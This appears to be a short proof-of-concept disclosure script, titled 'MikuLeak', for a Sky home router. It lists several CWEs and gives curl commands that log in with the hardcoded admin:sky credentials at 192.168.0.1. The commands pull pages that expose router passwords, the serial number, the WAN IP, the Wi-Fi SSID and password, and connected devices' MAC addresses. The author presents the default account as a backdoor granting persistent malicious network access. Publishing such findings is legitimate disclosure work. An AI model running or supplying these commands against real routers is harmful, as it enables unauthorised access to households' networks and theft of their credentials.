# MikuLeak - CWE 798 (Hardcoded Credentials), CWE 288 (Auth Bypass via Alt Channel, session/IP check skipped)
# CWE-354 (Bad MAC Validation, creds alone suffice),
# CWE-200 (Sensitive Info Exposure)

# I've been holding this bug back for 2 months, time constraints/wanting to find an interesting bug to chain with this before release

# Bad MAC/Session State Handling, combined with CWE 798
curl 192.168.0.1 -u admin:sky

# Proof of the 'file pull' bug
curl 192.168.0.1 -u admin:sky http://192.168.0.1/sky_wan_setup.html

# Proof Of CWE 200 - passwords, the firmware version, router serial number, WAN IP, SSID/Password, connected devices with MAC adresses, exposed in plaintext JS source code
curl 192.168.0.1 -u admin:sky http://192.168.0.1/sky_set_password.html

# Even though the admin account is not a backdoor, I'm calling it one for two reasons:

# 1. Even though it is documented (one Sky forum, many hobbyist things, SkyFail), casual users wouldn't know about it
# 2. Most users wouldn't change this password (because of Reason 1), so they wouldn't change it, meaning it could lead to persistent malicious network access

# ForeverDay

